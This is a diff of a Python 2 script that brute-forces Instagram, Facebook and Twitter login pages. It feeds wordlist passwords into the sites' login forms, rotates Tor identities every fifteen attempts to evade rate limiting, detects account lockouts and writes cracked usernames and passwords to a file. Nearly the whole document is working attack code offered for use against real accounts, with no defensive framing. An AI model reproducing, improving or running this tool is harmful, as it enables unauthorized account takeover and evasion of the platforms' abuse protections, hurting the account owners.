@@ -4,6 +4,8 @@
 #
 # @Author: Ethical H4CK3R
 #
+# Kali Linux Only
+#
 import os
 import time
 import socks
@@ -17,84 +19,160 @@ from Core import conf
 from platform import platform
 from Core.conf import userAgent
 
-class BruteForce(object):
- def __init__(self,email,passwords,url,username,password):
+class Browser(object):
+ def __init__(self):
+  self.br    = None
+  self.html  = None
+  self.getIp = 'https://wtfismyip.com/text'
+
+ def setup(self):
+  if not engine.tries:
+   engine.display()
+   print '  [-] Setting Up Browser {}...{}'.format(G,W);time.sleep(1.5)
+  if self.br:self.br.close()
+  self.br=mechanize.Browser()
+  self.br.set_handle_robots(False)
+  self.br.set_handle_equiv(True)
+  self.br.set_handle_referer(True)
+  self.br.set_handle_redirect(True)
+  self.br.set_cookiejar(cookielib.LWPCookieJar())
+  self.br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+  self.br.addheaders=[('User-agent',userAgent())]
+
+ def Id(self): # Returns current ip address
+  return self.br.open(self.getIp).read()
+
+ def visit(self):
+  if not engine.tries:
+   engine.display()
+   site='Instagram' if website==1 else 'Facebook' if website==2 else 'Twitter' if website==3 else None
+   print '  [-] Contacting {} {}...{}'.format(site,G,W);time.sleep(1.5)
+  try:self.br.open(url) 
+  except:self.refresh()
+   
+ def refresh(self):
+  Proxy().newId()
+  engine.ipAdd=self.Id()
+  self.visit()
+    
+ def fillForm(self,pwrd):
+  try:
+   self.br.select_form(nr=0)
+   self.br.form[password]=pwrd
+  except:self.refresh()  
+
+  try:self.br.form[username]=email
+  except:pass
+
+ def login(self,password):
+  if engine.alive:
+   self.fillForm(password)
+   try:self.br.submit()
+   except:pass 
+   try:self.html=self.br.response().read()
+   except:return
+   self.authenticate()
+   self.lock()  
+
+ def authenticate(self):
+  if any([not'login' in self.br.geturl(),'home.php' in self.br.geturl(),
+          'challenge' in self.br.geturl(),'checkpoint' in self.br.geturl()]):self.accessGranted() 
+
+ def accessGranted(self):
+  engine.display()
+  with open('Cracked.txt','a+') as save:
+   if not email in save and not engine.passw in save:
+    save.write('Username: {}\nPassword: {}\n\n'.format(email,engine.passw))  
+ 
+  print '  [-]{} Access Granted{}'.format(G,W)
+  print '  [-] Username: {}{}{}'.format(G,email,W)
+  print '  [-] Password: {}{}{}'.format(G,engine.passw,W)
+  engine.alive=False
+
+ def lock(self):
+  if 'try again later' in self.html:
+   engine.lock=True
+   engine.display()
+   subprocess.Popen(['service','tor','stop']).wait()
+   exit('\n{1}The Account Is {0}Locked{1} Try Again Later'.format(R,W))
+  
+class Proxy(object):
+ def newId(self):
+  self.restart()
+  self.proxyIp()
+  
+ # proxy config
+ def proxyIp(self):
+  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+  socket.socket=socks.socksocket
+  connects=self.connection
+  socket.connects=connects
+
+ def connection(self,address,timeout=None,source_address=None):
+  sock=socks.socksocket()
+  sock.connect(address)
+  return sock
+
+ def restart(self):
+  if not engine.tries:
+   engine.display()
+   print '  [-] Starting Tor {}...{}'.format(G,W);time.sleep(1.5)
+  subprocess.Popen(['service','tor','restart']).wait()
+  time.sleep(3)
+  self.proxyIp()
+
+ # Get Ip address
+ def IpAddress(self):
+  if not engine.tries:
+   engine.display()
+   print '  [-] Obtaining Proxy Ip {}...{}'.format(G,W);time.sleep(1.5) 
+  return engine.brwsr.Id()
+
+class Engine(object):
+ def __init__(self):
   self.atmpt = 0 
   self.tries = 0 
   self.alive = True
-  self.brwsr = None
   self.ipAdd = None
   self.lock  = None
   self.passw = None
+  self.brwsr = Browser()
   self.email = email
-  self.list  = passwords
+  self.list  = wordlist
 
   # Flexability
   self.url      = url
+  self.maxTries = 15
   self.username = username # The email/username field of the site
   self.password = password # The password field name of the site
 
- # Password authentication
- def login(self,passwrd,notLocked=7):
-  self.passw=passwrd
-  self.display()
-
-  # Fill form
-  try:
-   self.brwsr.select_form(nr=0)
-   self.brwsr.form[self.password]=passwrd
-  except:
-   self.ip()
-   self.ipAdd=self.ipAddr()
-   self.setupBrowser()
-   self.visit()
+ def read(self):
+  with open(self.list) as list:
+   for password in list:
+    yield password.replace('\n','')
    
-  try:self.brwsr.form[self.username]=self.email
-  except:pass
-
-  # Submit form
-  try:self.brwsr.submit()
-  except:pass
-
-  # Facebook lock
-  html=self.brwsr.response().read()
+ def config(self): 
+  Proxy().newId()# Change Ip
+  self.brwsr.setup()
+  time.sleep(1.5)
   
-  if 'try again later' in html:
-   self.lock=True
-   self.display()
-   subprocess.Popen(['service','tor','stop']).wait()
-   exit('\n{1}The Account Is {0}Locked{1} Try Again Later'.format(R,W))
-    
-  # Twitter lock
-  if 'locked' in self.brwsr.geturl(): 
-   if notLocked==3:self.lock=True # Twitter denial
+  self.ipAdd=Proxy().IpAddress() # Fetch Ip
+  self.display()
+  time.sleep(1.5)
 
-   if notLocked:
-    notLocked=-1
-    self.setupBrowser()
-    self.refresh()
-    self.login(passwrd,notLocked=notLocked)
-     
-   else:
-    self.lock=True
-    self.display()
-    subprocess.Popen(['service','tor','stop']).wait()
-    exit('\n{1}The Account Is {0}Locked{1} Try Again Later'.format(R,W)) 
-    
-  # Did it work
-  if any([not'login' in self.brwsr.geturl(),
-         'home.php'  in self.brwsr.geturl(),
-         'challenge' in self.brwsr.geturl()]):self.accessed(passwrd)
+  self.brwsr.visit() # Open url
+  self.display()
+  time.sleep(1.5)
 
- # After browser failure
- def refresh(self):
-  self.ip()
-  self.ipAdd=self.ipAddr()
-  self.visit()
- 
+  self.lock=False
+  self.display()
+  time.sleep(1.5)
+  
+  print '  [-] Starting Brute Force Session {}...{}'.format(G,W);time.sleep(3)
+  self.display()
+  time.sleep(1.5)
 
- # Screen Output
- def display(self,passwrd=''):
+ def display(self):
   self.ipAdd=self.ipAdd if self.ipAdd else ''
   art(password = self.passw,attempts=self.tries,
       username = self.email,wordlist=self.list,
@@ -102,129 +180,24 @@ class BruteForce(object):
       locked   = self.lock,
       website  = website)
 
- # AccessGranted
- def accessed(self,passwrd):
-  self.display()
-  print '  [-]{0} Access Granted{1}'.format(G,W)
-  print '  [-] Username: {}{}{}'.format(G,self.email,W)
-  print '  [-] Password: {}{}{}'.format(G,passwrd,W)
-  self.alive=False
+ def attack(self):
+  for password in self.read():
+   self.passw=password
 
- # proxy ip
- def proxyIp(self):
-  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
-  socket.socket=socks.socksocket
-  connects=self.connection
-  socket.connects=connects
+   if not self.alive:break
+   if self.atmpt==self.maxTries:
+    self.brwsr.setup()
+    self.brwsr.refresh()
+    self.atmpt=0 
+  
+   self.tries+=1
+   self.atmpt+=1
+   self.display()
+   self.brwsr.login(password)  
 
- # Tor connection
- def connection(self,address,timeout=None,source_address=None):
-  sock=socks.socksocket()
-  sock.connect(address)
-  return sock
-
- # Obtain ip
- def ip(self):
-  self.display()
-  if not self.tries:print '  [-] Starting Tor {}...{}'.format(G,W)
-  subprocess.Popen(['service','tor','restart']).wait()
-  time.sleep(3)
-  self.proxyIp()
-
- # Get Ip address
- def ipAddr(self):
-  self.display()
-  if not self.tries:print '  [-] Obtaining Proxy Ip {}...{}'.format(G,W);time.sleep(1.5)
-  try:
-   return self.brwsr.open('https://wtfismyip.com/text').read()
-  except:
-   self.ip()
-   self.setupBrowser()
-   self.ipAddr()  
-
- # Opens Url
- def visit(self):
-  self.display()
-   
-  site='Instagram' if website==1 else 'Facebook' if website==2 else 'Twitter' if website==3 else None
-  if not self.tries:print '  [-] Contacting {} {}...{}'.format(site,G,W);time.sleep(3)
-    
-  try:self.brwsr.open(self.url)
-  except:self.refresh()
-
- # The Brains
  def ai(self):
-  self.ip()
-  self.display()
-  time.sleep(1.5)
-
-  self.setupBrowser()
-  self.display()
-  time.sleep(1.5)
-
-  self.ipAdd=self.ipAddr()
-  self.display()
-  time.sleep(1.5)
-
-  self.visit()
-  self.display()
-  time.sleep(1.5)
-
-  # Reads wordlist & removes \n
-  def read(file):
-   for item in file:
-    yield item.replace('\n','')
-
-  self.lock=False
-  self.display()
-  time.sleep(1.5)
-  print '  [-] Starting Brute Force Session {}...{}'.format(G,W);time.sleep(3)
-  self.display()
-  time.sleep(1.5)
-
-  # BruteForce
-  with open(self.list) as wordlist:
-   for password in read(wordlist):
-    if not self.alive:break
-
-    # Obtain new ip
-    if website==1: # For instagram
-     if self.atmpt==15:
-      self.atmpt=0
-      self.setupBrowser()
-      self.refresh()
-
-    elif website==2: # For facebook
-     if self.atmpt==20:
-      self.atmpt=0
-      self.setupBrowser()
-      self.refresh()
-      time.sleep(random.randint(150,165))
-     
-    else: # For twitter
-     if self.atmpt==15:  
-      self.atmpt=0
-      self.setupBrowser()
-      self.refresh()
-
-    # Attempt to login
-    self.tries+=1
-    self.atmpt+=1
-    self.login(password)
-
- # Setup mechanize
- def setupBrowser(self):
-  self.display()
-  if self.brwsr:self.brwsr.close()  
-  if not self.tries:print '  [-] Setting Up Browser {}...{}'.format(G,W);time.sleep(3)
-  self.brwsr = mechanize.Browser()
-  self.brwsr.set_handle_robots(False)
-  self.brwsr.set_handle_equiv(True)
-  self.brwsr.set_handle_referer(True)
-  self.brwsr.set_handle_redirect(True)
-  self.brwsr.set_cookiejar(cookielib.LWPCookieJar())
-  self.brwsr.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-  self.brwsr.addheaders=[('User-agent',userAgent())]
+  self.config()
+  self.attack()  
    
 if __name__ == '__main__':
 
@@ -234,7 +207,7 @@ if __name__ == '__main__':
 
  # Kali linux only
  if not 'kali' in platform():
-  exit('Kali Linux 2.0 required')
+  exit('Kali Linux required')
 
  # Links
  instagram = 'https://www.instagram.com/accounts/login/?force_classic_login'
@@ -257,6 +230,7 @@ if __name__ == '__main__':
   attempts=attempts if attempts else ''
   website='Facebook' if website==2 else 'Instagram' if website==1 else 'Twitter' if website==3 else ''
   locked=locked if locked else '' if locked==None else locked
+  color=R if locked else G
 
   print ''
   print '  {}[-] Website:  {}{}'.format(W,G,website)
@@ -265,9 +239,7 @@ if __name__ == '__main__':
   print '  {}[-] Username: {}{}'.format(W,G,username)
   print '  {}[-] Password: {}{}'.format(W,G,password)
   print '  {}[-] Attempts: {}{}'.format(W,G,attempts)
-
-  if website=='Facebook' or website=='Twitter':
-   color=R if locked else G
+  if website=='Facebook':
    print '  {}[-] Account Locked: {}{}'.format(W,color,locked)
   print '\n{}+-------------------+{}\n'.format(R,W)
 
@@ -280,35 +252,34 @@ if __name__ == '__main__':
   time.sleep(.7)
 
   art(website=website)
-  username=raw_input('Enter Username:{} '.format(G))
-  username=username.title().replace('\n','')
+  email=raw_input('Enter Username:{} '.format(G))
+  email=email.title().replace('\n','')
   time.sleep(.7)
-  art(website=website,username=username)
+  art(website=website,username=email)
 
   wordlist=raw_input('Enter Wordlist: {}'.format(G))
   time.sleep(.7)
 
   # Set fields
-  if website==2:url,_username,_password=facebook,'email','pass'
-  elif website==1:url,_username,_password=instagram,'username','password'
-  else:url,_username,_password=twitter,'session[username_or_email]','session[password]'
+  if website==2:url,username,password=facebook,'email','pass'
+  elif website==1:url,username,password=instagram,'username','password'
+  else:url,username,password=twitter,'session[username_or_email]','session[password]'
 
   # Locate wordlist
   if not os.path.exists(wordlist):
    exit('\n{0}{1}{2} is not found'.format(R,wordlist,W))
 
-  art(website=website,username=username,wordlist=wordlist)
+  art(website=website,username=email,wordlist=wordlist)
   time.sleep(1.2)
 
   # Configure system enviroment
   conf.config()
 
-  # Bruteforce the accounts
-  attack=BruteForce(username,wordlist,url,_username,_password)
-  attack.ai()
+  # Start process
+  engine=Engine()
+  engine.ai()
+
  except KeyboardInterrupt:
-  try:attack.alive=False
-  except:pass
-  exit('\n\n{1}Exiting {0}...{1}'.format(R,W))
+  print '\n\n{1}Exiting {0}...{1}'.format(R,W)
  finally: 
   subprocess.Popen(['service','tor','stop']).wait()
